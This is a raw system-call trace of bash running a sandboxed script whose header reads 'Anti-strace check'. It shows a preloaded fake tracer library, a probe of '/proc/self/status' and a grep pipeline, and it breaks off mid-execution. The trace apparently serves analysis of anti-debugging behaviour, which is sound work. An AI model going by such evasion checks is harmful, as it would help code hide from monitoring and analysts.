9     14:56:48.638217 execve("/usr/bin/bash", ["bash", "/sandbox/sample.sh"], 0x7ffd555c3c40 /* 6 vars */) = 0
9     14:56:48.639503 brk(NULL)         = 0x5efc23a62000
9     14:56:48.640109 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7694e38db000
9     14:56:48.640800 openat(AT_FDCWD</sandbox>, "/lib/libfake_tracer.so", O_RDONLY|O_CLOEXEC) = 3</usr/lib/libfake_tracer.so>
9     14:56:48.642156 read(3</usr/lib/libfake_tracer.so>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
9     14:56:48.642804 fstat(3</usr/lib/libfake_tracer.so>, {st_mode=S_IFREG|0777, st_size=16376, ...}) = 0
9     14:56:48.643784 mmap(NULL, 19160, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0) = 0x7694e38d6000
9     14:56:48.644241 mmap(0x7694e38d7000, 4096, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x1000) = 0x7694e38d7000
9     14:56:48.644677 mmap(0x7694e38d8000, 4096, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x7694e38d8000
9     14:56:48.645102 mmap(0x7694e38d9000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/libfake_tracer.so>, 0x2000) = 0x7694e38d9000
9     14:56:48.645585 close(3</usr/lib/libfake_tracer.so>) = 0
9     14:56:48.646031 access("/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
9     14:56:48.646462 openat(AT_FDCWD</sandbox>, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3</etc/ld.so.cache>
9     14:56:48.646981 fstat(3</etc/ld.so.cache>, {st_mode=S_IFREG|0644, st_size=7295, ...}) = 0
9     14:56:48.647390 mmap(NULL, 7295, PROT_READ, MAP_PRIVATE, 3</etc/ld.so.cache>, 0) = 0x7694e38d4000
9     14:56:48.647829 close(3</etc/ld.so.cache>) = 0
9     14:56:48.648243 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libtinfo.so.6", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libtinfo.so.6.4>
9     14:56:48.648686 read(3</usr/lib/x86_64-linux-gnu/libtinfo.so.6.4>, "\177ELF\2\1\1\0\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\0\0\0\0\0\0\0\0"..., 832) = 832
9     14:56:48.649122 fstat(3</usr/lib/x86_64-linux-gnu/libtinfo.so.6.4>, {st_mode=S_IFREG|0644, st_size=208328, ...}) = 0
9     14:56:48.649517 mmap(NULL, 211240, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libtinfo.so.6.4>, 0) = 0x7694e38a0000
9     14:56:48.649921 mmap(0x7694e38ae000, 77824, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libtinfo.so.6.4>, 0xe000) = 0x7694e38ae000
9     14:56:48.650299 mmap(0x7694e38c1000, 57344, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libtinfo.so.6.4>, 0x21000) = 0x7694e38c1000
9     14:56:48.650723 mmap(0x7694e38cf000, 20480, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libtinfo.so.6.4>, 0x2e000) = 0x7694e38cf000
9     14:56:48.651143 close(3</usr/lib/x86_64-linux-gnu/libtinfo.so.6.4>) = 0
9     14:56:48.651494 openat(AT_FDCWD</sandbox>, "/lib/x86_64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3</usr/lib/x86_64-linux-gnu/libc.so.6>
9     14:56:48.651864 read(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0>\0\1\0\0\0\220\243\2\0\0\0\0\0"..., 832) = 832
9     14:56:48.652212 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
9     14:56:48.652555 fstat(3</usr/lib/x86_64-linux-gnu/libc.so.6>, {st_mode=S_IFREG|0755, st_size=2125328, ...}) = 0
9     14:56:48.652908 pread64(3</usr/lib/x86_64-linux-gnu/libc.so.6>, "\6\0\0\0\4\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0@\0\0\0\0\0\0\0"..., 784, 64) = 784
9     14:56:48.653256 mmap(NULL, 2170256, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0) = 0x7694e368e000
9     14:56:48.653618 mmap(0x7694e36b6000, 1605632, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x28000) = 0x7694e36b6000
9     14:56:48.653980 mmap(0x7694e383e000, 323584, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1b0000) = 0x7694e383e000
9     14:56:48.654372 mmap(0x7694e388d000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3</usr/lib/x86_64-linux-gnu/libc.so.6>, 0x1fe000) = 0x7694e388d000
9     14:56:48.654804 mmap(0x7694e3893000, 52624, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x7694e3893000
9     14:56:48.655177 close(3</usr/lib/x86_64-linux-gnu/libc.so.6>) = 0
9     14:56:48.655544 mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7694e368c000
9     14:56:48.655901 arch_prctl(ARCH_SET_FS, 0x7694e368cb80) = 0
9     14:56:48.656303 set_tid_address(0x7694e368ce50) = 9
9     14:56:48.656966 set_robust_list(0x7694e368ce60, 24) = 0
9     14:56:48.657380 rseq(0x7694e368d4a0, 0x20, 0, 0x53053053) = 0
9     14:56:48.658004 mprotect(0x7694e388d000, 16384, PROT_READ) = 0
9     14:56:48.658634 mprotect(0x7694e38cf000, 16384, PROT_READ) = 0
9     14:56:48.659106 mprotect(0x7694e38d9000, 4096, PROT_READ) = 0
9     14:56:48.659854 mprotect(0x5efc1b232000, 16384, PROT_READ) = 0
9     14:56:48.660302 mprotect(0x7694e3913000, 8192, PROT_READ) = 0
9     14:56:48.660817 prlimit64(0, RLIMIT_STACK, NULL, {rlim_cur=8192*1024, rlim_max=RLIM64_INFINITY}) = 0
9     14:56:48.661254 munmap(0x7694e38d4000, 7295) = 0
9     14:56:48.661760 openat(AT_FDCWD</sandbox>, "/dev/tty", O_RDWR|O_NONBLOCK) = -1 ENXIO (No such device or address)
9     14:56:48.662273 ioctl(0</dev/null>, TCGETS, 0x7ffd8d3b1510) = -1 ENOTTY (Inappropriate ioctl for device)
9     14:56:48.662764 getrandom("\x7a\x74\x9c\x8d\xc7\x8c\x71\x78", 8, GRND_NONBLOCK) = 8
9     14:56:48.663164 brk(NULL)         = 0x5efc23a62000
9     14:56:48.663525 brk(0x5efc23a83000) = 0x5efc23a83000
9     14:56:48.663946 getuid()          = 1001
9     14:56:48.664379 getgid()          = 1001
9     14:56:48.664776 geteuid()         = 1001
9     14:56:48.665223 getegid()         = 1001
9     14:56:48.665695 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     14:56:48.666121 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
9     14:56:48.666485 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330}, 8) = 0
9     14:56:48.666891 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
9     14:56:48.667265 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
9     14:56:48.667638 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
9     14:56:48.668029 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
9     14:56:48.668391 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
9     14:56:48.668741 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
9     14:56:48.669084 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
9     14:56:48.669422 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
9     14:56:48.669760 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
9     14:56:48.670139 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
9     14:56:48.670482 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     14:56:48.670877 rt_sigaction(SIGQUIT, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
9     14:56:48.671251 uname({sysname="Linux", nodename="97c4bc2edabd", ...}) = 0
9     14:56:48.671658 getcwd("/sandbox", 4096) = 9
9     14:56:48.672025 getpid()          = 9
9     14:56:48.672386 getppid()         = 1
9     14:56:48.672759 newfstatat(AT_FDCWD</sandbox>, ".", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
9     14:56:48.673240 newfstatat(AT_FDCWD</sandbox>, "/usr/local/sbin/bash", 0x7ffd8d3b10d0, 0) = -1 ENOENT (No such file or directory)
9     14:56:48.673792 newfstatat(AT_FDCWD</sandbox>, "/usr/local/bin/bash", 0x7ffd8d3b10d0, 0) = -1 ENOENT (No such file or directory)
9     14:56:48.674290 newfstatat(AT_FDCWD</sandbox>, "/usr/sbin/bash", 0x7ffd8d3b10d0, 0) = -1 ENOENT (No such file or directory)
9     14:56:48.674761 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/bash", {st_mode=S_IFREG|0755, st_size=1446024, ...}, 0) = 0
9     14:56:48.675137 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/bash", {st_mode=S_IFREG|0755, st_size=1446024, ...}, 0) = 0
9     14:56:48.675495 geteuid()         = 1001
9     14:56:48.675866 getegid()         = 1001
9     14:56:48.676264 getuid()          = 1001
9     14:56:48.676736 getgid()          = 1001
9     14:56:48.677193 access("/usr/bin/bash", X_OK) = 0
9     14:56:48.677626 newfstatat(AT_FDCWD</sandbox>, "/usr/bin/bash", {st_mode=S_IFREG|0755, st_size=1446024, ...}, 0) = 0
9     14:56:48.678055 geteuid()         = 1001
9     14:56:48.678478 getegid()         = 1001
9     14:56:48.678909 getuid()          = 1001
9     14:56:48.679348 getgid()          = 1001
9     14:56:48.679760 access("/usr/bin/bash", R_OK) = 0
9     14:56:48.680200 socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 3<socket:[566]>
9     14:56:48.680693 connect(3<socket:[566]>, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
9     14:56:48.681248 close(3<socket:[566]>) = 0
9     14:56:48.681744 socket(AF_UNIX, SOCK_STREAM|SOCK_CLOEXEC|SOCK_NONBLOCK, 0) = 3<socket:[567]>
9     14:56:48.682181 connect(3<socket:[567]>, {sa_family=AF_UNIX, sun_path="/var/run/nscd/socket"}, 110) = -1 ENOENT (No such file or directory)
9     14:56:48.682693 close(3<socket:[567]>) = 0
9     14:56:48.683133 newfstatat(AT_FDCWD</sandbox>, "/etc/nsswitch.conf", {st_mode=S_IFREG|0644, st_size=494, ...}, 0) = 0
9     14:56:48.683623 newfstatat(AT_FDCWD</sandbox>, "/", {st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
9     14:56:48.684071 openat(AT_FDCWD</sandbox>, "/etc/nsswitch.conf", O_RDONLY|O_CLOEXEC) = 3</etc/nsswitch.conf>
9     14:56:48.684538 fstat(3</etc/nsswitch.conf>, {st_mode=S_IFREG|0644, st_size=494, ...}) = 0
9     14:56:48.684986 read(3</etc/nsswitch.conf>, "# /etc/nsswitch.conf\n#\n# Example"..., 4096) = 494
9     14:56:48.685427 read(3</etc/nsswitch.conf>, "", 4096) = 0
9     14:56:48.685854 fstat(3</etc/nsswitch.conf>, {st_mode=S_IFREG|0644, st_size=494, ...}) = 0
9     14:56:48.686283 close(3</etc/nsswitch.conf>) = 0
9     14:56:48.686743 openat(AT_FDCWD</sandbox>, "/etc/passwd", O_RDONLY|O_CLOEXEC) = 3</etc/passwd>
9     14:56:48.687223 fstat(3</etc/passwd>, {st_mode=S_IFREG|0644, st_size=1044, ...}) = 0
9     14:56:48.687655 lseek(3</etc/passwd>, 0, SEEK_SET) = 0
9     14:56:48.688050 read(3</etc/passwd>, "root:x:0:0:root:/root:/bin/bash\n"..., 4096) = 1044
9     14:56:48.688476 close(3</etc/passwd>) = 0
9     14:56:48.688945 getpid()          = 9
9     14:56:48.689346 getppid()         = 1
9     14:56:48.689891 getpid()          = 9
9     14:56:48.690930 getppid()         = 1
9     14:56:48.691650 getpgrp()         = 1
9     14:56:48.692269 ioctl(2<pipe:[2810]>, TIOCGPGRP, 0x7ffd8d3b1424) = -1 ENOTTY (Inappropriate ioctl for device)
9     14:56:48.692886 rt_sigaction(SIGCHLD, {sa_handler=0x5efc1b144230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330}, 8) = 0
9     14:56:48.693413 ioctl(2<pipe:[2810]>, TIOCGPGRP, 0x7ffd8d3b13d4) = -1 ENOTTY (Inappropriate ioctl for device)
9     14:56:48.693940 prlimit64(0, RLIMIT_NPROC, NULL, {rlim_cur=RLIM64_INFINITY, rlim_max=RLIM64_INFINITY}) = 0
9     14:56:48.694447 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     14:56:48.694976 openat(AT_FDCWD</sandbox>, "/sandbox/sample.sh", O_RDONLY) = 3</sandbox/sample.sh>
9     14:56:48.696533 newfstatat(AT_FDCWD</sandbox>, "/sandbox/sample.sh", {st_mode=S_IFREG|0777, st_size=1423, ...}, 0) = 0
9     14:56:48.697223 ioctl(3</sandbox/sample.sh>, TCGETS, 0x7ffd8d3b1530) = -1 ENOTTY (Inappropriate ioctl for device)
9     14:56:48.697909 lseek(3</sandbox/sample.sh>, 0, SEEK_CUR) = 0
9     14:56:48.698326 read(3</sandbox/sample.sh>, "#!/bin/bash\n\n# --- Anti-strace c"..., 80) = 80
9     14:56:48.698933 lseek(3</sandbox/sample.sh>, 0, SEEK_SET) = 0
9     14:56:48.699380 prlimit64(0, RLIMIT_NOFILE, NULL, {rlim_cur=1024*1024, rlim_max=1024*1024}) = 0
9     14:56:48.699763 fcntl(255, F_GETFD) = -1 EBADF (Bad file descriptor)
9     14:56:48.700173 dup2(3</sandbox/sample.sh>, 255) = 255</sandbox/sample.sh>
9     14:56:48.700594 close(3</sandbox/sample.sh>) = 0
9     14:56:48.700974 fcntl(255</sandbox/sample.sh>, F_SETFD, FD_CLOEXEC) = 0
9     14:56:48.701369 fcntl(255</sandbox/sample.sh>, F_GETFL) = 0x8000 (flags O_RDONLY|O_LARGEFILE)
9     14:56:48.701755 fstat(255</sandbox/sample.sh>, {st_mode=S_IFREG|0777, st_size=1423, ...}) = 0
9     14:56:48.702338 lseek(255</sandbox/sample.sh>, 0, SEEK_CUR) = 0
9     14:56:48.702797 read(255</sandbox/sample.sh>, "#!/bin/bash\n\n# --- Anti-strace c"..., 1423) = 1423
9     14:56:48.703383 faccessat2(AT_FDCWD</sandbox>, "/proc/self/status", R_OK, AT_EACCESS) = 0
9     14:56:48.703837 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     14:56:48.704230 pipe2([3<pipe:[570]>, 4<pipe:[570]>], 0) = 0
9     14:56:48.704652 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
9     14:56:48.705043 rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
9     14:56:48.705453 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
9     14:56:48.705837 rt_sigprocmask(SIG_BLOCK, [INT TERM CHLD], [], 8) = 0
9     14:56:48.706282 lseek(255</sandbox/sample.sh>, -1209, SEEK_CUR) = 214
9     14:56:48.706924 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7694e368ce50) = 10
9     14:56:48.707652 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
10    14:56:48.707836 set_robust_list(0x7694e368ce60, 24 <unfinished ...>
9     14:56:48.707998 <... rt_sigprocmask resumed>NULL, 8) = 0
10    14:56:48.708159 <... set_robust_list resumed>) = 0
9     14:56:48.708316 rt_sigaction(SIGCHLD, {sa_handler=0x5efc1b144230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330},  <unfinished ...>
10    14:56:48.708477 getpid( <unfinished ...>
9     14:56:48.708634 <... rt_sigaction resumed>{sa_handler=0x5efc1b144230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330}, 8) = 0
10    14:56:48.708795 <... getpid resumed>) = 10
9     14:56:48.708955 close(4<pipe:[570]> <unfinished ...>
10    14:56:48.709119 close(255</sandbox/sample.sh> <unfinished ...>
9     14:56:48.709301 <... close resumed>) = 0
10    14:56:48.709454 <... close resumed>) = 0
9     14:56:48.709607 rt_sigprocmask(SIG_BLOCK, [INT],  <unfinished ...>
10    14:56:48.709766 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
9     14:56:48.709921 <... rt_sigprocmask resumed>[], 8) = 0
10    14:56:48.710079 <... rt_sigprocmask resumed>NULL, 8) = 0
9     14:56:48.710236 read(3<pipe:[570]>,  <unfinished ...>
10    14:56:48.710396 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
10    14:56:48.710899 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
10    14:56:48.711307 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
10    14:56:48.711708 rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
10    14:56:48.712117 rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
10    14:56:48.712527 rt_sigaction(SIGCHLD, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330}, {sa_handler=0x5efc1b144230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330}, 8) = 0
10    14:56:48.712949 rt_sigaction(SIGCHLD, {sa_handler=0x5efc1b144230, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x7694e36d3330}, 8) = 0
10    14:56:48.713380 rt_sigaction(SIGINT, {sa_handler=0x5efc1b16c540, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
10    14:56:48.713787 dup2(4<pipe:[570]>, 1<pipe:[2809]>) = 1<pipe:[570]>
10    14:56:48.714206 close(4<pipe:[570]>) = 0
10    14:56:48.714625 close(3<pipe:[570]>) = 0
10    14:56:48.715094 rt_sigprocmask(SIG_BLOCK, NULL, [], 8) = 0
10    14:56:48.715534 rt_sigprocmask(SIG_BLOCK, [CHLD], [], 8) = 0
10    14:56:48.715929 fcntl(0</dev/null>, F_GETFD) = 0
10    14:56:48.716315 pipe2([3<pipe:[574]>, 4<pipe:[574]>], 0) = 0
10    14:56:48.716737 rt_sigprocmask(SIG_BLOCK, NULL, [CHLD], 8) = 0
10    14:56:48.717124 rt_sigprocmask(SIG_BLOCK, [INT TERM CHLD], [CHLD], 8) = 0
10    14:56:48.717489 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0x7694e368ce50) = 11
11    14:56:48.718009 set_robust_list(0x7694e368ce60, 24 <unfinished ...>
10    14:56:48.718171 rt_sigprocmask(SIG_SETMASK, [CHLD],  <unfinished ...>
11    14:56:48.718305 <... set_robust_list resumed>) = 0
10    14:56:48.718446 <... rt_sigprocmask resumed>NULL, 8) = 0
11    14:56:48.718673 getpid( <unfinished ...>
10    14:56:48.718844 close(4<pipe:[574]> <unfinished ...>
11    14:56:48.719006 <... getpid resumed>) = 11
10    14:56:48.719152 <... close resumed>) = 0
11    14:56:48.719298 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
10    14:56:48.719514 close(4 <unfinished ...>
11    14:56:48.719747 <... rt_sigprocmask resumed>NULL, 8) = 0
10    14:56:48.719932 <... close resumed>) = -1 EBADF (Bad file descriptor)
11    14:56:48.720126 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330},  <unfinished ...>
10    14:56:48.720311 rt_sigprocmask(SIG_BLOCK, NULL,  <unfinished ...>
11    14:56:48.720487 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
10    14:56:48.720667 <... rt_sigprocmask resumed>[CHLD], 8) = 0
11    14:56:48.720839 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330},  <unfinished ...>
10    14:56:48.720997 rt_sigprocmask(SIG_BLOCK, [INT TERM CHLD],  <unfinished ...>
11    14:56:48.721149 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
10    14:56:48.721300 <... rt_sigprocmask resumed>[CHLD], 8) = 0
11    14:56:48.721468 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330},  <unfinished ...>
10    14:56:48.721653 clone(child_stack=NULL, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD <unfinished ...>
11    14:56:48.721801 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
12    14:56:48.722114 set_robust_list(0x7694e368ce60, 24 <unfinished ...>
11    14:56:48.722267 close(3<pipe:[574]> <unfinished ...>
10    14:56:48.722439 <... clone resumed>, child_tidptr=0x7694e368ce50) = 12
12    14:56:48.722624 <... set_robust_list resumed>) = 0
11    14:56:48.722823 <... close resumed>) = 0
12    14:56:48.723033 getpid( <unfinished ...>
10    14:56:48.723373 rt_sigprocmask(SIG_SETMASK, [CHLD],  <unfinished ...>
12    14:56:48.723558 <... getpid resumed>) = 12
11    14:56:48.723723 dup2(4<pipe:[574]>, 1<pipe:[570]> <unfinished ...>
12    14:56:48.723946 rt_sigprocmask(SIG_SETMASK, [],  <unfinished ...>
10    14:56:48.724156 <... rt_sigprocmask resumed>NULL, 8) = 0
12    14:56:48.724348 <... rt_sigprocmask resumed>NULL, 8) = 0
11    14:56:48.724524 <... dup2 resumed>) = 1<pipe:[574]>
12    14:56:48.724699 rt_sigaction(SIGTSTP, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330},  <unfinished ...>
10    14:56:48.724871 close(3<pipe:[574]> <unfinished ...>
12    14:56:48.725041 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
11    14:56:48.725216 close(4<pipe:[574]> <unfinished ...>
12    14:56:48.725381 rt_sigaction(SIGTTIN, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330},  <unfinished ...>
10    14:56:48.725534 <... close resumed>) = 0
12    14:56:48.725686 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
11    14:56:48.725842 <... close resumed>) = 0
12    14:56:48.725991 rt_sigaction(SIGTTOU, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330},  <unfinished ...>
10    14:56:48.726217 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
12    14:56:48.726415 <... rt_sigaction resumed>{sa_handler=SIG_DFL, sa_mask=[], sa_flags=SA_RESTORER, sa_restorer=0x7694e36d3330}, 8) = 0
11    14:56:48.726640 newfstatat(AT_FDCWD</sandbox>, ".",  <unfinished ...>
12    14:56:48.726888 dup2(3<pipe:[574]>, 0</dev/null> <unfinished ...>
10    14:56:48.727106 <... rt_sigprocmask resumed>[CHLD], 8) = 0
12    14:56:48.727313 <... dup2 resumed>) = 0<pipe:[574]>
11    14:56:48.727489 <... newfstatat resumed>{st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
12    14:56:48.727693 close(3<pipe:[574]> <unfinished ...>
10    14:56:48.727881 rt_sigprocmask(SIG_SETMASK, [CHLD],  <unfinished ...>
12    14:56:48.728062 <... close resumed>) = 0
11    14:56:48.728227 newfstatat(AT_FDCWD</sandbox>, "/usr/local/sbin/grep",  <unfinished ...>
12    14:56:48.728427 newfstatat(AT_FDCWD</sandbox>, ".",  <unfinished ...>
10    14:56:48.728624 <... rt_sigprocmask resumed>NULL, 8) = 0
12    14:56:48.728794 <... newfstatat resumed>{st_mode=S_IFDIR|0755, st_size=4096, ...}, 0) = 0
